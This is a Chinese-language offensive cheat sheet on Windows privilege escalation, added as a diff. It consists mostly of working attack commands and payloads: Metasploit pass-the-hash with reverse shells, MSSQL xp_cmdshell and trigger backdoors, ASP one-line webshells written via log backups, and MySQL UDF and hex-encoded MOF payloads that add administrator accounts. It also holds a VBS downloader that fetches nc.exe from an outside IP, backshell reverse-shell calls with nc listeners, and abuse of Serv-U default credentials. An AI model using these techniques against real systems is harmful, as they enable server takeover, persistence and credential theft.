@@ -1,0 +1,1077 @@
+windows提权
+{
+一、系统漏洞提权（缓冲区溢出漏洞）
+{
+	1.溢出提权:
+	{
+		1>本地溢出
+		{
+			原理：有执行的权限的用户向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root/Adminstrator权限。
+			注意：不要找带空格的目录，exp后缀可以更改，找可读写目录
+			a.pr
+				pr.com "whoami"
+			b.巴西烤肉
+			churr
+		}
+		2>远程溢出
+		{
+			原理：远程溢出提权是指攻击者只需要与服务器建立网络连接，然后根据系统的漏洞，使用相应的exp，即可获取到远程服务器的root权限。
+			a.eternalblue
+		}
+	}
+	2.getpass提权
+	{
+		一款获取计算机用户账号密码的工具，运行getpass.exe即可获取用户密码
+	}
+	3.hash传递入侵提权
+	{
+		在msf中执行：
+			msfconsole   //启动终端
+			use exploit/windows/smb/psexec //用到模块
+			show options //查看模块选项属性
+			set PAYLOAD windows/meterpreter/reverse_tcp   //设置漏洞利用载体
+			Show targets //查看模块的攻击目标属性
+			set LHOST //设置本机地址
+			set RHOST 192.168.0.254 //设置属性目标主机地址
+			set SMBUser administrators //设置属性用户
+			set SMBPass  xxx  //设置属性密文hash，在Windows下用Pwdump7来获取hash值,为管理员用户名、权限后的16进制数值
+			exploit  //开始攻击
+			shell //获取当前shell,执行命令
+		
+	}
+	4.lpk提权
+	{
+		触发：目录下存在exe文件被执行，他的特点是每个可执行文件运行之前都要加载该文件，windows系统是先判断当前文件目录是否存在此文件，如果目录下存在该文件则执行,如果不存在则会执行system32目录下的dll
+		启动方案：3389远程桌面连接启动（连续shift，然后按热键）
+		提权方案：
+			1>生成lpk.dll，通过webshell上传至文件目录，等待管理员去触发exe程序。
+				运行LPK Setch这个工具选择，2键启动，此时的2键3键值为LPK Sethc内置固定的数字，比如65,66就对应a与b。
+				然后点击生成，将生成的lpk.dll上传至任意目录,并运行其中的任何一个exe文件,lpk.dll将会自动替换为shift后门。
+				然后远程连接，连续按五次shift键，会出现粘滞键的提示
+				接着同时按下组合键(也就是在哪里设置的65,66,对应的A,B)，就会出现下面的密码框
+				输入密码，就会进入提权界面!!!
+			2>还可以用来执行软件，比如用来开3389，在生成lpk.dll是选中执行CMD，
+				cmd路径：C:\windows\system32/cmd.exe
+				命令：-pk Sethc v4\3389.vbs
+				生成lpk.dll然后放到任意目录下，未执行软件之前远程是关闭的
+				然后执行exe软件，你好发现远程被打开了。
+
+	}
+	5.提权常用CMD命令
+	{
+		Whoami //查看当前用户权限
+		Systeminfo //查看计算机的信息（操作系统，位数，补丁情况等）
+		Tasklist /svc //查看计算机的进程
+		Netstat -ano //查看计算机的网络端口连接
+		netstart //查看计算机当前启动的服务
+		Net user //查看计算机的用户
+		Net user name pass /add //添加用户
+		Net localgroup administrators name /add //添加至管理员用户组
+		Net user name /del 删除用户名为name的用户 //删除
+		pwd
+		
+		提权常用命令
+			1.net.exe
+				net user hacker 123456 /add
+				net localgroup Administrators hacker /add
+				net user hacker
+				ner user hacker newPassword
+				net user hacker /del
+				Net Localgroup
+			2.cacls
+				cacls FileName [/t] [/e] [/c] [/g User:permission] [/r User [...]] [/p User:permission [...]] [/d User [...]]
+				cacls flag.txt /e /t /g system:F
+			3.上传cmd.exe到可以写目录 c:\temp 或者 c:\recycler 都有权限
+				setp cmd.exe 把cmd.exe设置到终端
+				查看当前用户:whoami
+				系统补丁:systeminfo
+				查看3389端口pid:tasklist /svc
+				然后 netstat -ano 对应pid就是3389端口
+				进入3389 
+					REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+				运行mstsc
+				
+		$IPC提权
+		{
+			net view
+			net use
+			net use \\10.0.0.59\ipc$
+			net use \\10.0.0.59 /u:10.0.0.59\ma mama
+			
+			net use z: \\10.0.0.59\c$
+			net view \\127.0.0.1	//在 \\127.0.0.1 的共享资源
+			dir \\127.0.0.1\share			
+			dir \\10.0.0.59\d$
+			copy ntlm.exe \\127.0.0.1\admin$
+			
+			net time \\10.0.0.59
+			at \\10.0.0.59 whoami
+			at \\10.0.0.59 11:07 cmd /c shutdown /f /t 0
+			at \\10.0.0.59
+		}
+
+hash破解网址
+	http://www.objectif-securite.ch
+	}
+}
+
+二、信息泄露提权
+{
+	
+}
+
+
+三、第三方软件提权（数据库、ftp、服务器管理软件、445）
+（一）数据库提权
+{
+	MSSQL提权：
+	{
+		1.菜刀管理数据库提权
+		查看数据库配置文件，获取SA账户密码
+		编辑数据库配置：
+			<T>ADO</T>
+			<C>Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=123456</C>
+		右键管理数据库
+		在数据库中执行提权
+			信息搜集：
+				Exec master.dbo.xp_cmdshell 'whoami'
+				Exec master.dbo.xp_cmdshell 'systeminfo'
+				Exec master.dbo.xp_cmdshell 'netstat -ano'
+				Exec master.dbo.xp_cmdshell 'net start [service]'
+				SELECT IS_SRVROLEMEMBER('sysadmin')
+				EXEC master..xp_cmdshell 'set'
+			
+			读取注册表
+				EXEC master..xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
+				EXEC master..xp_regwrite HKEY_LOCAL_MACHINE,'SOFTWARE\Microsoft\Windows\CurrentVersion\Run','F','REG_SZ','test.exe'
+			
+			创建对象CMDshell
+				EXEC master..xp_dirtree 'C:\',1,1
+				EXEC master..sp_addextendedproc 'xp_cmdshell','xplog70.dll'
+				EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE
+				
+			添加管理员用户：
+				Exec master.dbo.xp_cmdshell 'net user'
+				Exec master.dbo.xp_cmdshell 'net user mssql_tq_caidao 123 /add'
+				Exec master.dbo.xp_cmdshell 'net localgroup Administrators'
+				Exec master.dbo.xp_cmdshell 'net localgroup Administrators mssql_tq_caidao /add'
+			
+			开启3389端口：
+				REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+			关闭3389：
+				net stop "TermService"
+				sc config TermService start= disabled
+			
+			服务管理：
+				msconfig
+				mstsc
+				services.msc
+		2.大马管理数据库提权
+		上传大马
+		1>连接数据库
+		执行数据库提权查询语句
+			Exec master.dbo.xp_cmdshell ' '
+		2>执行asp的shell命令
+			cmd命令  sa   pass
+		3>db_owner插入触发器提权
+			在db_wner他所在管理的表里，创建一个触发器,等管理员用sa用户去执行插入表命令的时候会触发，达到提权的效果
+			创建触发器命令
+				create TRIGGER TR_HACKER1 ON bairong_Users
+				AFTER INSERT
+				AS
+				BEGIN
+					EXECUTE SP_ADDEXTENDEDPROC 'MASTER.DBO.XP_CMDSHELL','XPLOG70.DLL'--'XPSQL70.DLL'
+					EXECUTE MASTER.DBO.XP_CMDSHELL 'NET START TELNET'
+					EXECUTE MASTER.DBO.XP_CMDSHELL 'net user xiaoguai www.h4x0er.com /add'
+					EXECUTE MASTER.DBO.XP_CMDSHELL 'net localgroup administrators xiaoguai /add'
+				End
+			当管理员在bairong_Users这个表里插入Username:xiaoguai；Password:11111的时候,就会触发我们留下的后门：
+				INSERT INTO bairong_Users(UserName,Password) VALUES('xiaoguai','11111')
+		4>启动项提权
+			利用db_owner的权限备份到启动项那里,写创建账号的密码的bat或vbs,
+				上传路径 C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\add.vbs
+				add.vbs:
+					set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+					os="WinNT://"&wsnetwork.ComputerName
+					Set ob=GetObject(os)
+					Set oe=GetObject(os&"/Administrators,group")
+					Set od=ob.Create("user","web")
+					od.SetPassword "web609150260"
+					od.SetInfo
+					Set of=GetObject(os&"/web",user)
+					oe.add os&"/web"
+
+			其实在MMSQL 中如果开启了 SQL Server Agent 服务的话可以通过低权限下建立帐户.
+			Code:
+				EXEC sp_add_job @job_name = jktest,
+				@enabled = 1,
+				@delete_level = 1
+				EXEC sp_add_jobstep @job_name = jktest,
+				@step_name = ExeC my sql,
+				@subsystem = TSQL,
+				@CommAnd = exeC master..xp_exeCresultSet NseleCt exeC
+				master..xp_Cmdshell &quot;<% =Serverdos%>&gt;C:jk.txt&quot;,NMaster
+				EXEC sp_add_jobServer @job_name = jktest,
+				@Server_name = <%=Servername%>
+				EXEC sp_start_job @job_name = jktest
+		5>沙盘提权:
+			开启沙盘模式;exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE/Microsoft/Jet/4.0/Engines','SandBoxMode','REG_DWORD',1--
+			然后利用jet.oledb执行系统命令:
+				select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("cmd.exe /c cmdline")')--
+			p.s：2000系统WINDOWS改为WINNT
+			
+		6>利用SQL代理执行命令，当然必须先开启SQL代理服务，默认情况下这个服务是关闭的.
+		我们可以先利用xp_servicecontrol开启SQLSERVERAGENT，然后建立个SQL计划任务，然后马上运行这个任务。
+			exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT' 
+			use msdb exec sp_delete_job null,'x'  
+			exec sp_add_job 'x' 
+			exec sp_add_jobstep Null,'x',Null,'1','CMDEXEC','cmd /c Dir C:\'  
+			exec sp_add_jobserver Null,'x',@@servername exec sp_start_job 'x'
+
+		3.储存过程直接提权
+		SA权限:利用XP_CMDSHELL,Sp_OACreate等储存过程直接提权.(前提储存过程健在)
+		相关SQL语句
+			XP_CMDSHELL:
+				数字型：EXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
+				字符型&搜索型：EXEC MASTER.DBO.XP_CMDSHELL 'CMDLINE'--
+			Sp_OACreate:
+				数字型:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
+				字符型&搜索型:declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:/windows/system32/cmd.exe /c cmdline'--
+			p.s.(2000系统WINDOWS改为WINNT)
+		
+		直接备份一句话木马：
+			exec sp_makewebtask 'WEB绝对路径/fuck.asp',' select ''<%25execute(request("a"))%25>'' ';--
+			P.S.(WEB与DATA在同一主机,知道WEB目录)
+		4.工具提权
+		1>sqltools
+			连接数据库
+			执行提权cmd命令
+		
+		5.其他提权
+		下载文件到目标主机方式:
+			利用NBSI等工具写入VBS文件
+			echo Set xPost = CreateObject(^"Microsoft.XMLHTTP^"):xPost.Open ^"GET^",^"http://125.113.114.49/nc.exe^",0:xPost.Send():Set sGet = CreateObject(^"ADODB.Stream^"):sGet.Mode = 3:sGet.Type =1:sGet.Open():sGet.Write(xPost.responseBody):sGet.SaveToFile ^"c:/c.exe^",2 >c:/labeng.vbs
+			该语句作用:写一个名为labeng的VBS文件到C盘;
+			接着执行CSCRIPT C:/LABENG.VBS;
+			VBS文件作用:下载http://125.113.114.49/nc.exe到C:/C.EXE;
+
+		FTP&TFTP传输:
+			FTP:
+			CMDLINE依次输入
+				ECHO FTP>FTP.TXT
+				ECHO OPEN 125.*.*.*>>FTP.TXT
+				ECHO USERNAME>>FTP.TXT
+				ECHIO PASSWORD>>FTP.TXT
+				ECHO GET XX.EXE>>FTP.TXT
+				ECHO BYE>>FTP.TXT
+			作用:写一个FTP.TXT文件,内容为
+				FTP
+				OPEN 125.*.*.*
+				USERNAME
+				PASSWORD
+				GET XX.EXE
+				BYE
+			接着执行:
+				FTP -S:FTP.TXT
+			目标主机就会到125.*.*.*下载XX.EXE;
+			TFTP类似~~
+
+			DB权限:
+			WEB&DATA同一主机:1,列目录找到WEB目录,LOG或差异备份拿WEBSHELL,接着提权,2,猜表拿管理员ID和密码,进后台拿WEBSHELL..3,备份提权语句到启动项,等待重起
+			分离的情况:1,猜表拿管理员ID和密码,进后台拿WEBSHELL..2,备份提权语句到启动项,等待重起.
+
+			判断DATA主机IP:
+			本地NC -L -V -P 1433 监听1433端口
+			;insert into opendatasource('sqloledb','server=自己的IP;uid=test;pwd=test; database=test').test.dbo.ku select name from master.dbo.sysdatabases--
+
+			暴WEB路径(PS:DATA&WEB同一主机)
+			;create table labeng(lala nvarchar(255), null)--
+			;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM/ControlSet001/Services/W3SVC/Parameters/Virtual Roots','/',@result output insert into labeng (lala) values(@result);--
+			;and 1=(select count(*) from labeng where lala>1)-- 或者 ;and 1=(selet top 1 lala from labeng)--
+
+			过滤'的处理:
+			;DECLARE @S VARCHAR(4000);SET @S=CAST(SQL语句的十六进制数 AS VARCHAR(4000));EXEC(@S)--
+
+			LOG备份语句:
+			;alter database 表 set RECOVERY FULL--
+			;create table cmd (a image)--
+			;backup log 表 to disk = 'c:/Sammy' with init--
+			;insert into cmd (a) values ('<%%25Execute(request("value"))%%25>')--
+			;backup log 表 to disk = 'WEB目录/1.asp'--
+
+			一句话变形:
+			a).<%%25Execute(request("go"))%%25>
+			b).<%Execute(request("go"))%>
+			c).%><%execute request("go")%><%
+			d).<script language=VBScript runat=server>execute request("sb")</Script>
+			e).<%25Execute(request("l"))%25>
+
+			备份文件到启动项:
+			将LOG备份中'<%%25Execute(request("value"))%%25>'改为HTA.BAT等文件的十六进制内容
+
+			例:labeng.hta
+			内容:
+			<SCRIPT LANGUAGE="VBScript">
+			on error resume next
+			Set WS = createobject("WScript.Shell")
+			WS.run "cmd /c net1.exe user test$ labeng?123 /add & net1.exe localgroup
+			administrators test$ /add & del labeng.hta",0
+			</script>
+			<script language=javascript>window.close();</script>
+			-----------------------------------------------------------------------------
+			转化为十六进制:
+			0x3C534352495054204C414E47554147453D225642536372697074223E0D0A6F6E206572726F7220726573756D65206E6578740D0A536574205753203D206372656174656F626A6563742822575363726970742E5368656C6C22290D0A57532E72756E2022636D64202F63206E6574312E6578652075736572207465737424206C6162656E673F313233202F6164642026206E6574312E657865206C6F63616C67726F75702061646D696E6973747261746F7273207465737424202F61646420262064656C206C6162656E672E687461222C300D0A3C2F7363726970743E3C736372697074206C616E67756167653D6A6176617363726970743E77696E646F772E636C6F736528293B3C2F7363726970743E0D0A0D0A0D0A
+			-----------------------------------------------------------------------------
+			SQL语句:
+			;insert into cmd (a) values(0x3C534352495054204C414E47554147453D225642536372697074223E0D0A6F6E206572726F7220726573756D65206E6578740D0A536574205753203D206372656174656F626A6563742822575363726970742E5368656C6C22290D0A57532E72756E2022636D64202F63206E6574312E6578652075736572207465737424206C6162656E673F313233202F6164642026206E6574312E657865206C6F63616C67726F75702061646D696E6973747261746F7273207465737424202F61646420262064656C206C6162656E672E687461222C300D0A3C2F7363726970743E3C736372697074206C616E67756167653D6A6176617363726970743E77696E646F772E636C6F736528293B3C2F7363726970743E0D0A0D0A0D0A)--
+
+			------------------------------------------------------------------------------------
+			提升SQL用户为SA权限:
+			<SCRIPT LANGUAGE="VBScript">
+			on error resume next
+			Set WS = createobject("WScript.Shell")
+			WS.run "cmd /c echo exec master.dbo.sp_addsrvrolemember
+			boayo,sysadmin>c:/test.qry & isql -E /U alma /P /i c:/test.qry & del
+			labeng.hta",0
+			</script>
+			<script language=javascript>window.close();</script>	
+	}
+	mysql提权：
+	{
+		1.UDF提权
+		{
+			1>大马导出udf提权：
+				上传udf文件至可读写目录:
+				5.1及以下版本
+					select @@basedir;  
+					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\system32\\udf.dll' //低版本5.0以下
+					select load_file('C:\\Inetpub\\wwwroot\\udf32.dll') into dumpfile 'c:\\windows\\udf.dll' //低版本5.0以下
+				5.1以上版本
+					select @@plugin_dir
+					select load_file('C:\\?\\udf32.dll') into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll' //高版本5.0以上
+
+				NTFS ADS文件流导出dll文件到plugin文件夹
+					解决Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在
+					//查找到mysql的目录
+					select 'dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';  
+					//利用NTFS ADS创建lib目录
+					select 'dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
+					//利用NTFS ADS创建plugin目录		
+				cmdshell命令:
+					create function cmdshell returns string soname 'moonudf.dll'
+					select cmdshell('命令')
+					select backshell('你的ip',12345)
+					nc -l -p 12345 
+			
+			2>提权脚本提权
+				上传提权脚本，导出udf文件，创建cmdshell,执行select cmdshell('提权命令');
+				MYSQL=>5.1
+					用 select @@plugin_dir 查询plugin路径
+					导出路径：%mysql%\\plugin\\udf.dll   
+				MYSQL<=5.0默认为系统目录
+					C:\\WINDOWS\\udf.dll    或    C:\\WINDOWS\\system32\\udf.dll
+				默认udf自带函数:
+					cmdshell 执行cmd;
+					downloader 下载者,到网上下载指定文件并保存到指定目录;
+					open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
+					backshell 反弹Shell;
+					ProcessView 枚举系统进程;
+					KillProcess 终止指定进程;
+					regread 读注册表;
+					regwrite 写注册表;
+					shut 关机,注销,重启;
+					about 说明与帮助函数;
+				说明：
+					默认添加管理员账号 密码123456
+					默认反弹端口12345
+					不要随便删除刚创建的函数 重新生效要mysql重启
+					别人的udf 请自行看别人的udf说明
+				常用命令
+					create function cmdshell returns string soname 'moonudf.dll'
+					select cmdshell('命令')
+					select backshell('你的ip',12345)
+					nc -l -p 12345 
+			3>提权工具提权
+				sqltools
+				需要数据库允许外联，提权工具登录数据库，执行上传udf，注意上传路径问题，执行select cmdshell命令
+				
+			4>菜刀提权
+			菜刀配置连接数据库，执行sql语句导入UDF文件，创建CMDSHELL函数，执行cmd命令
+				C:\ProgramData\udf64.dll   
+				C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\
+				load_file，into dumpfile
+				Select load_file('C:/ProgramData/udf64.dll') into dumpfile 'C:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/testudf.dll'
+				create function cmdshell returns string soname 'testudf.dll';
+				select cmdshell('命令')
+		}
+		2.MOF提权
+		{
+			找个可写目录，我这里是C:\recycler\，把payload写到nullevt.mof文件里
+			菜刀、大马连接数据库后，select load_file('C:\\RECYCLER\\nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
+			payload:
+			{
+				#pragma namespace("\\\\.\\root\\subscription") 
+				instance of __EventFilter as $EventFilter 
+				{ 
+					EventNamespace = "Root\\Cimv2"; 
+					Name  = "filtP2"; 
+					Query = "Select * From __InstanceModificationEvent " 
+							"Where TargetInstance Isa \"Win32_LocalTime\" " 
+							"And TargetInstance.Second = 5"; 
+					QueryLanguage = "WQL"; 
+				}; 
+				instance of ActiveScriptEventConsumer as $Consumer 
+				{ 
+					Name = "consPCSV2"; 
+					ScriptingEngine = "JScript"; 
+					ScriptText = 
+					"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; 
+				}; 
+
+				instance of __FilterToConsumerBinding 
+				{ 
+					Consumer   = $Consumer; 
+					Filter = $EventFilter; 
+				};
+			}
+			mof提权防护办法：
+			{
+				法1：
+					net stop winmgmt //停止服务
+					DEL D:\aaaaa\*.*  或  RD /S D:\aaaaa	//删除文件夹：C:\WINDOWS\system32\wbem\Repository
+				 	net start winmgmt //启动服务
+				法2：在sql中执行以下代码，效果是一样的
+					select char(35,112,114,97,103,109,97,32,110,97,109,101,115,112,97,99,101,40,34,92,92,92,92,46,92,92,114,111,111,116,92,92,115,117,98,115,99,114,105,112,116,105,111,110,34,41,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,69,118,101,110,116,70,105,108,116,101,114,32,97,115,32,36,69,118,101,110,116,70,105,108,116,101,114,13,10,123,13,10,32,32,32,32,69,118,101,110,116,78,97,109,101,115,112,97,99,101,32,61,32,34,82,111,111,116,92,92,67,105,109,118,50,34,59,13,10,32,32,32,32,78,97,109,101,32,32,61,32,34,102,105,108,116,80,50,34,59,13,10,32,32,32,32,81,117,101,114,121,32,61,32,34,83,101,108,101,99,116,32,42,32,70,114,111,109,32,95,95,73,110,115,116,97,110,99,101,77,111,100,105,102,105,99,97,116,105,111,110,69,118,101,110,116,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,87,104,101,114,101,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,32,73,115,97,32,92,34,87,105,110,51,50,95,76,111,99,97,108,84,105,109,101,92,34,32,34,13,10,32,32,32,32,32,32,32,32,32,32,32,32,34,65,110,100,32,84,97,114,103,101,116,73,110,115,116,97,110,99,101,46,83,101,99,111,110,100,32,61,32,53,34,59,13,10,32,32,32,32,81,117,101,114,121,76,97,110,103,117,97,103,101,32,61,32,34,87,81,76,34,59,13,10,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,65,99,116,105,118,101,83,99,114,105,112,116,69,118,101,110,116,67,111,110,115,117,109,101,114,32,97,115,32,36,67,111,110,115,117,109,101,114,13,10,123,13,10,32,32,32,32,78,97,109,101,32,61,32,34,99,111,110,115,80,67,83,86,50,34,59,13,10,32,32,32,32,83,99,114,105,112,116,105,110,103,69,110,103,105,110,101,32,61,32,34,74,83,99,114,105,112,116,34,59,13,10,32,32,32,32,83,99,114,105,112,116,84,101,120,116,32,61,13,10,32,32,32,32,34,118,97,114,32,87,83,72,32,61,32,110,101,119,32,65,99,116,105,118,101,88,79,98,106,101,99,116,40,92,34,87,83,99,114,105,112,116,46,83,104,101,108,108,92,34,41,92,110,87,83,72,46,114,117,110,40,92,34,110,101,116,46,101,120,101,32,108,111,99,97,108,103,114,111,117,112,32,97,100,109,105,110,105,115,116,114,97,116,111,114,115,32,97,100,109,105,110,32,47,97,100,100,92,34,41,34,59,13,10,32,125,59,13,10,13,10,105,110,115,116,97,110,99,101,32,111,102,32,95,95,70,105,108,116,101,114,84,111,67,111,110,115,117,109,101,114,66,105,110,100,105,110,103,13,10,123,13,10,32,32,32,32,67,111,110,115,117,109,101,114,32,32,32,61,32,36,67,111,110,115,117,109,101,114,59,13,10,32,32,32,32,70,105,108,116,101,114,32,61,32,36,69,118,101,110,116,70,105,108,116,101,114,59,13,10,125,59) into dumpfile  'c:/windows/system32/wbem/mof/nullevt.mof';  
+			}
+		}
+		3.启动项提权
+		{
+			上传路径 C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\add.vbs,系统重新启动后执行add.vbs
+			select load_file('C:\\Inetpub\\wwwroot\\add.vbs') into dumpfile 'C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\add.vbs'
+			add.vbs:
+			{
+				set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+				os="WinNT://"&wsnetwork.ComputerName
+				Set ob=GetObject(os)
+				Set oe=GetObject(os&"/Administrators,group")
+				Set od=ob.Create("user","web")
+				od.SetPassword "web609150260"
+				od.SetInfo
+				Set of=GetObject(os&"/web",user)
+				oe.add os&"/web"
+			}
+			利用SQL命令来进行VBS脚本的创建及添加。
+				create table secist(cmd text);
+				insert into secist values(“set wshshell=createobject(“”wscript.shell””)”);
+				insert into secist values(“a=wshshell.run(“”cmd.exe /c net user secist secist.com /add“”,0)”);
+				insert into secist values(“b=wshshell.run(“”cmd.exe /c net localgroup administrators secist /add“”,0)”);
+				select * from secist into dumpfile “C:\Documents and Settings\All Users\「开始」菜单\程序\启动\secist.vbs”;
+		
+		4.大马直接提权（本质是UDF提权）
+			连接数据库，安装dll文件，执行提权命令
+		
+		5.数据库反弹端口连接提权
+			假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？
+				1>利用mysql客户端工具连接mysql服务器，然后执行下面的操作。
+					mysql.exe -h 172.16.10.11 -uroot -p
+					Enter password:
+					mysql> \. c:\mysql.txt
+					mysql>select backshell("YourIP",2010);
+				2>本地监听你反弹的端口
+					nc.exe -vv -l -p 2010
+				成功后，你将获得一个system权限的cmdshell，其实这个也是利用的UDF提权
+		6.数据库管理员账号密码的获取
+		{
+			1>配置文件泄露
+			{
+				config.inc
+				web.config
+			}
+			2>下载数据库文件存储表
+			{	
+				mysql/data/mysql/user.myd
+			}
+			3>暴力破解工具
+			{
+				Hscan，hydra，x-scan，3306爆破
+			}
+		}
+
+	}
+	Acces提权：
+	{
+		
+	}
+	Oracle提权:
+	{
+
+	虚拟主机提权:
+
+	星外提权
+
+	西部数码提权
+
+	华众虚拟主机提权
+	}
+}	
+（二）FTP提权
+{
+	1.server-U提权
+	{
+		原理：漏洞是使用Serv-u本地默认管理端口43958，以默认管理员登陆新建域和用户来执行命令
+			Serv-u>3.x版本默认本地管理端口是：43958，默认管理员：LocalAdministrator，默认密码：#l@$ak#.lk;0@P
+		操作：
+		{
+			1>大马提权
+			2>webshell执行ftp命令行提权
+			3>server-U本地溢出提权
+			4>serv-u ftp本地溢出权限提升(使用6.0以及以前版本)
+			{
+				1、用Serv-U提权综合工具生成提权工具serv_u.exe
+				2、先上传 serv_u.exe 到一个盘符下 比如是d盘
+				3、执行命令 d:\serv_u.exe
+				4、d:\serv_u.exe “net user username password /add” (注意命令要有引号)
+				5、d:\serv_u.exe “net localgroup administrators username /add” (注意命令要有引号)
+			}
+			5>serv-UDaemon.ini文件重写提权
+			{
+				ServUDaemon.ini 文件重写后提权(对ServUDaemon.ini有写入的权限)。
+				注意，我在serv-u6.4.06中测试没有成功，即虽然FTP用户添加成功，但添加的用户没有命令执行权限（虽然显示添加的用户是管理员用户）。所以，在实际环境中本方法不一定成功，不过要尝试以下。
+				先修改Domain来添加用户
+					[Domain1]
+					User2=spider|1|0
+				然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：
+					[USER=spiger|1]
+					Password=sbd8b58b5c201ee5cc20f9a8551197d4a5
+					HomeDir=c:\
+					RelPaths=3
+					TimeOut=600
+					Maintenance=System
+					Access1=C:\|RWAMELCDP
+					Access2=d:\|RWAMELCDP
+					Access3=e:\|RWAMELCDP
+					SKEYValues=
+				添加上述代码并保存后，就会在serv-u中添加用户名为spiger，密码是123456。
+				通过在本地命令行执行ftp提权命令：
+					quote site exec net user spiger 123456 /add
+					quote site exec net localgroup administrators spiger /add
+				ps：上述添加的文件中最重要的是Maintenance=System这句，有了这句添加的FTP用户才是管理员用户，才会有命令执行权限（因为最后是通过FTFP执行命令来添加系统用户的）。
+			}
+			6>ftp口令破解
+				serv-u配置文件无修改权限，但是可以看到配置文件，进行口令破解
+				FTP用户的配置文件ServUDaemon.ini，在其中找到Maintenance=System的用户，该用户就是系统管理员。
+				如果能够成功破解系统管理员的口令，就可以利用该管理员执行添加系统管理员的用户
+				serv-u配置文件中Password字段就是用户口令加密变换后的字符串
+				破解方法：去掉前两位，剩下的进行md5破解，破解后再去掉前两位，剩下的就是FTP用户口令。
+			7>serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权（这是最常用的方法，一般大马中集成的serv-u提权方法就是本方法）
+				serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是LocalAdministrator,默认密码是”#l@$ak#.lk;0@P“，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。
+				虽然，网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用文本文件打开，查找LocalAdministrator字符来获取口令位置：
+				操作：
+				{
+					在目标Webshell上运行LCX：
+						lcx -slave 你的IP 5000 127.0.0.1 43958
+					在本机上运行：
+						lcx -listen 5000 21
+					打开本地的SERV_U 在IP上填入127.0.0.1 帐号写LocalAdministrator 密码#l@$ak#.lk;0@P
+					此时的连接过程是：本机连接21端口——>转发往本机5000端口——>管道连接至远程机5000端口——>转发至远程43958端口
+					连接成功后，在本机登陆Serv_U就相当于登陆了远程的Serv_U。
+					你可以FTP登陆本机IP,输入上面的帐号和密码，在远程FTP服务器上执行命令。
+				}
+			8>serv-u7中管理员的口令在C:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.Archive文件中
+		}
+		防御与bypass:
+			防护方法1：设置目录权限，通过去掉Web目录iusr用户的执行权限来防止使用Webshell来运行Exp程序。
+			对策：这种方法有一定的局限性，需要设置的目录很多，不能有一点疏漏，比如我就发现很多虚拟主机在C:\Documents and Settings\All Users\ Documents目录以及下边几个子目录Documents没有设置权限，导致可以在这个目录上传并运行Exp，这种目录还有x:\php,x:\perl等，因为这种目录都是everyone完全控制的。有些主机还支持php,pl,aspx等，这简直就是服务器的Serv-U灾难，运行程序更加方便。
+			
+			防护方法2：修改Serv-u管理端口，用Ultraedit打开ServUDaemon.exe查找B6AB(43958的16进制)，替换成自己定义的端口比如3930（12345），打开ServUAdmin.exe找到最后一个B6AB替换成3930（12345）,启动Serv-u，现在本地管理端口就成了12345了：
+						TCP 127.0.0.1:12345 0.0.0.0:0 LISTENING
+			对策：netstat –an,就能看到端口了，有人说netstat无法运行，其实你再上传个netstat.exe到可执行目录运行就ok了，然后修改一下Exp编译，上传运行就好了，我修改了一个可以自定义端口的Exp,运行格式：
+				USAGE: serv-u.exe port "command"
+				Example: serv-u.exe 43958 "net user xl xiaoxue /add"
+			防护方法3：修改管理员名和密码，用Ultraedit打开ServUDaemon.exe查找Ascii：LocalAdministrator，和#l@$ak#.lk;0@P，修改成等长度的其它字符就可以了，ServUAdmin.exe也一样处理。
